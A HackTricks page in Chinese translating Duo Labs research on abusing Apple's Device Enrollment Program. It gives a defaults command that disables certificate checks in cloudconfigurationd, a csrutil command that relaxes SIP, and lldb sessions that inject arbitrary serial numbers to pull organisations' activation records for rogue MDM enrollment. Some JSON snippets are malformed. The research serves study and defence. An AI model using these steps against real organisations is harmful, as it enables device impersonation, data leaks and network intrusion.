# 在其他组织中注册设备

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 简介

如[**之前评论**](./#what-is-mdm-mobile-device-management)**，** 为了尝试将设备注册到组织中，**只需要属于该组织的序列号**。一旦设备注册，许多组织将在新设备上安装敏感数据：证书、应用程序、WiFi密码、VPN配置[等等](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf)。\
因此，如果注册过程没有正确保护，这可能是攻击者的危险入口点。

**以下研究取自** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

## 反向过程

### 参与DEP和MDM的二进制文件

在我们的研究中，我们探索了以下内容：

* **`mdmclient`**：由操作系统用来与MDM服务器通信。在macOS 10.13.3及更早版本中，它也可以用来触发DEP签到。
* **`profiles`**：一个可以用来在macOS上安装、移除和查看配置文件的实用工具。它也可以用来在macOS 10.13.4及更新版本上触发DEP签到。
* **`cloudconfigurationd`**：设备注册客户端守护进程，负责与DEP API通信并检索设备注册配置文件。

使用`mdmclient`或`profiles`启动DEP签到时，会使用`CPFetchActivationRecord`和`CPGetActivationRecord`函数来检索_激活记录_。`CPFetchActivationRecord`通过[XPC](https://developer.apple.com/documentation/xpc)将控制权委托给`cloudconfigurationd`，然后从DEP API检索_激活记录_。

`CPGetActivationRecord`从缓存中检索_激活记录_（如果可用）。这些函数定义在私有配置文件框架中，位于`/System/Library/PrivateFrameworks/Configuration Profiles.framework`。

### 反向工程Tesla协议和Absinthe方案

在DEP签到过程中，`cloudconfigurationd`从_iprofiles.apple.com/macProfile_请求_激活记录_。请求负载是一个包含两个键值对的JSON字典：
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
载荷使用内部称为“Absinthe”的方案进行签名和加密。加密后的载荷随后进行Base 64编码，并用作HTTP POST请求的请求体，发送到_iprofiles.apple.com/macProfile_。

在`cloudconfigurationd`中，获取_Activation Record_由`MCTeslaConfigurationFetcher`类处理。从`[MCTeslaConfigurationFetcher enterState:]`开始的一般流程如下：
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
由于 **Absinthe** 方案似乎是用来验证对 DEP 服务的请求的，**逆向工程** 这个方案将允许我们对 DEP API 进行自己的认证请求。然而，这证明是**耗时**的，主要是因为认证请求涉及的步骤数量。我们没有完全逆向这个方案是如何工作的，而是选择探索其他方法，作为 _激活记录_ 请求的一部分插入任意序列号。

### MITMing DEP 请求

我们探索了使用 [Charles Proxy](https://www.charlesproxy.com) 代理对 _iprofiles.apple.com_ 网络请求的可行性。我们的目标是检查发送到 _iprofiles.apple.com/macProfile_ 的有效载荷，然后插入一个任意序列号并重放请求。如前所述，由 `cloudconfigurationd` 提交到该端点的有效载荷是 [JSON](https://www.json.org) 格式，并包含两个键值对。
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
由于 _iprofiles.apple.com_ 的API使用了[传输层安全性](https://en.wikipedia.org/wiki/Transport\_Layer\_Security)（TLS），我们需要在Charles中为该主机启用SSL代理，以查看SSL请求的明文内容。

然而，`-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` 方法会检查服务器证书的有效性，如果无法验证服务器信任，将会中止。
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
上面显示的错误消息位于一个名为_Errors.strings_的二进制文件中，该文件的键为`CLOUD_CONFIG_SERVER_TRUST_ERROR`，位于`/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`路径下，与其他相关错误消息一起。
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
_Errors.strings_ 文件可以使用内置的 `plutil` 命令[以人类可读格式打印](https://duo.com/labs/research/mdm-me-maybe#error_strings_output)。
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
在进一步研究了 `MCTeslaConfigurationFetcher` 类之后，我们发现，通过在 `com.apple.ManagedClient.cloudconfigurationd` 配置域上启用 `MCCloudConfigAcceptAnyHTTPSCertificate` 配置选项，可以绕过这种服务器信任行为。
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate` 配置选项可以使用 `defaults` 命令设置。
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
在为 _iprofiles.apple.com_ 启用了 SSL 代理，并配置 `cloudconfigurationd` 接受任何 HTTPS 证书后，我们尝试在 Charles Proxy 中进行中间人攻击并重放请求。

然而，由于发送到 _iprofiles.apple.com/macProfile_ 的 HTTP POST 请求体中包含的有效载荷是用 Absinthe（`NACSign`）签名和加密的，**无法修改纯文本 JSON 有效载荷以包含任意序列号，除非同时拥有解密它的密钥**。尽管有可能获得密钥，因为它保留在内存中，但我们转而探索使用 [LLDB](https://lldb.llvm.org) 调试器的 `cloudconfigurationd`。

### 对与 DEP 交互的系统二进制文件进行插桩

我们探索的最后一种方法，用于自动化向 _iprofiles.apple.com/macProfile_ 提交任意序列号的过程，是对直接或间接与 DEP API 交互的原生二进制文件进行插桩。这涉及到使用 [Hopper v4](https://www.hopperapp.com) 和 [Ida Pro](https://www.hex-rays.com/products/ida/) 对 `mdmclient`、`profiles` 和 `cloudconfigurationd` 进行一些初步探索，以及与 `lldb` 进行一些漫长的调试会话。

这种方法相对于修改二进制文件并用我们自己的密钥重新签名的好处之一是，它可以绕过 macOS 内置的一些可能会阻碍我们的权限限制。

**系统完整性保护**

为了对 macOS 上的系统二进制文件（如 `cloudconfigurationd`）进行插桩，必须禁用 [系统完整性保护](https://support.apple.com/en-us/HT204899)（SIP）。SIP 是一种安全技术，用于保护系统级文件、文件夹和进程免受篡改，它默认在 OS X 10.11 “El Capitan” 及更高版本上启用。[可以通过](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) 启动到恢复模式并在终端应用程序中运行以下命令来禁用 SIP，然后重启：
```
csrutil enable --without debug
```
请注意，SIP 是一个有用的安全功能，除了在非生产机器上进行研究和测试目的外，不应该禁用它。在非关键虚拟机上进行这些操作也是可能的（并且推荐），而不是在宿主操作系统上。

**使用 LLDB 的二进制插桩**

在禁用了 SIP 之后，我们就能够继续对与 DEP API 交互的系统二进制文件进行插桩，特别是 `cloudconfigurationd` 二进制文件。因为 `cloudconfigurationd` 需要提升权限才能运行，我们需要用 `sudo` 启动 `lldb`。
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
在`lldb`等待的同时，我们可以通过在另一个终端窗口运行`sudo /usr/libexec/mdmclient dep nag`来附加到`cloudconfigurationd`。一旦附加，类似于以下的输出将会显示，并且可以在提示符下输入LLDB命令。
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**设置设备序列号**

我们在逆向 `mdmclient` 和 `cloudconfigurationd` 时首先寻找的是负责检索系统序列号的代码，因为我们知道序列号最终负责认证设备。我们的目标是在序列号从 [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) 检索后，在内存中修改它，并在 `cloudconfigurationd` 构建 `macProfile` 负载时使用该序列号。

尽管 `cloudconfigurationd` 最终负责与 DEP API 通信，我们还调查了系统序列号是否在 `mdmclient` 中直接检索或使用。下面显示的检索到的序列号并非发送到 DEP API 的序列号，但它确实揭示了一个硬编码的序列号，如果启用了特定配置选项，则会使用该序列号。
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
系统序列号从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)检索，除非`sub_10002000f`的返回值非零，在这种情况下，它被设置为静态字符串“2222XXJREUF”。检查该函数后，看起来它似乎用于检查“服务器压力测试模式”是否启用。
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
我们记录了“服务器压力测试模式”的存在，但没有进一步探索，因为我们的目标是修改呈现给DEP API的序列号。相反，我们测试了修改`r14`寄存器指向的序列号是否足以检索不属于我们正在测试的机器的_激活记录_。

接下来，我们研究了系统序列号在`cloudconfigurationd`中是如何检索的。
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
如上所述，序列号也可以从 [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) 中的 `cloudconfigurationd` 获取。

使用 `lldb`，我们能够通过为 `IOServiceGetMatchingService` 设置断点，并创建一个包含任意序列号的新字符串变量，然后重写 `r14` 寄存器，使其指向我们创建的变量的内存地址，从而修改从 [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) 检索到的序列号。
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
虽然我们成功地修改了从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)检索到的序列号，但`macProfile`有效载荷仍然包含系统序列号，而不是我们写入`r14`寄存器的那个。

**利用：在JSON序列化之前修改配置请求字典**

接下来，我们尝试了另一种设置`macProfile`有效载荷中发送的序列号的方法。这次，我们没有修改通过[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)检索到的系统序列号，而是试图找到代码中序列号仍然是明文的最接近点，在被Absinthe（`NACSign`）签名之前。最佳的查看点似乎是`-[MCTeslaConfigurationFetcher startConfigurationFetch]`，它大致执行以下步骤：

* 创建一个新的`NSMutableData`对象
* 调用`[MCTeslaConfigurationFetcher setConfigurationData:]`，传递新的`NSMutableData`对象
* 调用`[MCTeslaConfigurationFetcher profileRequestDictionary]`，它返回一个包含两个键值对的`NSDictionary`对象：
  * `sn`：系统序列号
  * `action`：要执行的远程操作（以`sn`作为其参数）
* 调用`[NSJSONSerialization dataWithJSONObject:]`，传递`profileRequestDictionary`的`NSDictionary`
* 使用Absinthe（`NACSign`）签名JSON有效载荷
* 对签名的JSON有效载荷进行Base64编码
* 设置HTTP方法为`POST`
* 设置HTTP正文为Base64编码的签名JSON有效载荷
* 设置`X-Profile-Protocol-Version` HTTP头为`1`
* 设置`User-Agent` HTTP头为`ConfigClient-1.0`
* 使用`[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]`方法执行HTTP请求

然后，在转换为JSON之前，我们修改了从`profileRequestDictionary`返回的`NSDictionary`对象。为此，在`dataWithJSONObject`上设置了一个断点，以便尽可能接近尚未转换的数据。断点成功，当我们打印我们通过反汇编知道的寄存器的内容（`rdx`）时，我们得到了我们期望看到的结果。
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
上面是由 `[MCTeslaConfigurationFetcher profileRequestDictionary]` 返回的 `NSDictionary` 对象的美化打印表示。我们的下一个挑战是修改包含序列号的内存中的 `NSDictionary`。
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
上面的列表执行以下操作：

* 为 `dataWithJSONObject` 选择器创建一个常规表达式断点
* 等待 `cloudconfigurationd` 进程启动，然后附加到它
* 继续执行程序（因为我们遇到的第一个 `dataWithJSONObject` 的断点不是在 `profileRequestDictionary` 上调用的）
* 创建并打印（由于 `/x` 而以十六进制格式）我们任意 `NSDictionary` 的结果
* 由于我们已经知道所需键的名称，我们可以简单地将序列号设置为我们选择的 `sn`，并保持操作不变
* 创建这个新 `NSDictionary` 的结果的打印输出告诉我们，在特定内存位置有两个键值对

我们的最后一步是重复相同的步骤，将我们自定义 `NSDictionary` 对象的内存位置写入 `rdx`，该对象包含我们选择的序列号：
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
```markdown
这将 `rdx` 寄存器指向我们新的 `NSDictionary`，就在它被序列化为 [JSON](https://www.json.org) 并 `POST` 到 _iprofiles.apple.com/macProfile_ 之前，然后 `continue` 程序流。

在序列化为 JSON 之前修改配置文件请求字典中的序列号的这种方法奏效了。使用已知良好的 DEP 注册的苹果序列号替换 (null) 时，`ManagedClient` 的调试日志显示了该设备的完整 DEP 配置文件：
```
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
仅需几个`lldb`命令，我们就可以成功插入一个任意序列号，并获取一个包含各种组织特定数据的DEP配置文件，包括组织的MDM注册URL。如讨论所述，这个注册URL可以用来注册一个恶意设备，现在我们知道了它的序列号。其他数据可以用来社会工程学地注册一个恶意设备。一旦注册，设备就可以接收任意数量的证书、配置文件、应用程序、VPN配置等。

### 使用Python自动化`cloudconfigurationd`工具的操作

一旦我们有了使用序列号检索有效DEP配置文件的初步概念验证，我们就开始自动化这个过程，以展示攻击者可能如何滥用这种认证弱点。

幸运的是，LLDB API可以通过[脚本桥接接口](https://lldb.llvm.org/python-reference.html)在Python中使用。在安装了[Xcode命令行工具](https://developer.apple.com/download/more/)的macOS系统上，可以如下导入`lldb` Python模块：
```
import lldb
```
```markdown
这使我们能够相对容易地编写一个概念验证脚本，演示如何插入一个已注册DEP的序列号，并收到一个有效的DEP配置文件作为回应。我们开发的PoC接受一个由换行符分隔的序列号列表，并将它们注入到`cloudconfigurationd`进程中以检查DEP配置文件。

![Charles SSL代理设置。](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP通知。](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### 影响

有多种情况下，苹果的设备注册计划可能被滥用，导致暴露组织的敏感信息。最明显的两种情况涉及获取设备所属组织的信息，这可以从DEP配置文件中检索到。第二种是使用这些信息执行恶意DEP和MDM注册。下面将进一步讨论这些情况。

#### 信息泄露

如前所述，DEP注册过程的一部分涉及从DEP API请求并接收一个_激活记录_（或DEP配置文件）。通过提供一个有效的、已注册DEP的系统序列号，我们能够检索以下信息（根据macOS版本，要么打印到`stdout`，要么写入`ManagedClient`日志）。
```
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
虽然某些组织的部分信息可能是公开可用的，但拥有组织设备的序列号以及从DEP配置文件中获得的信息，可以用来对组织的服务台或IT团队进行各种社会工程攻击，例如请求密码重置或帮助将设备注册到公司的MDM服务器。

#### 恶意DEP注册

[Apple MDM协议](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf)支持通过[HTTP基本认证](https://en.wikipedia.org/wiki/Basic\_access\_authentication)进行MDM注册前的用户认证，但并不要求。**如果没有认证，通过DEP在MDM服务器上注册设备所需的只是一个有效的、已注册DEP的序列号**。因此，攻击者如果获得了这样一个序列号（无论是通过[OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence)、社会工程还是暴力破解），只要该设备当前没有在MDM服务器上注册，就能够将自己的设备注册为组织所拥有的设备。本质上，如果攻击者能够在真正的设备之前启动DEP注册，他们就能够假冒该设备的身份。

组织可以 - 也确实在 - 利用MDM部署敏感信息，如设备和用户证书、VPN配置数据、注册代理、配置文件以及各种其他内部数据和组织机密。此外，一些组织选择不要求用户在MDM注册过程中进行认证。这有各种好处，如更好的用户体验，以及不必[将内部认证服务器暴露给MDM服务器来处理在企业网络外进行的MDM注册](https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep)。

然而，当利用DEP来引导MDM注册时，这就出现了一个问题，因为攻击者将能够将其选择的任何端点注册到组织的MDM服务器。此外，一旦攻击者成功地将其选择的端点注册到MDM，他们可能获得特权访问权限，这可以用来进一步在网络内部进行渗透。

<details>

<summary><strong>从零开始学习AWS黑客攻击，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
